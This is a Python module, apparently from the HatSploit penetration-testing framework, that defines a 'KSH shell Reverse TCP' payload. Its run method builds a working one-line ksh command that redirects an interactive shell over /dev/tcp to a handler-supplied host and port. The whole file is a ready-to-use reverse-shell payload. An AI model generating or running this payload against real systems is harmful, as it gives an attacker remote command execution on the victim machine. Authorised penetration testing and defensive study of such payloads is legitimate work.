"""
This payload requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.payload import Payload


class HatSploitPayload(Payload):
    details = {
        'Name': "KSH shell Reverse TCP",
        'Payload': "unix/generic/ksh_reverse_tcp",
        'Authors': [
            'Ivan Nikolsky (enty8080) - payload developer',
        ],
        'Description': "KSH shell reverse TCP payload.",
        'Architecture': "generic",
        'Platform': "unix",
        'Rank': "high",
        'Type': "reverse_tcp",
    }

    def run(self):
        remote_host = self.handler['RHOST']
        remote_port = self.handler['RPORT']

        payload = f"ksh -c 'ksh >/dev/tcp/{remote_host}/{remote_port} 2>&1 <&1'"
        return payload
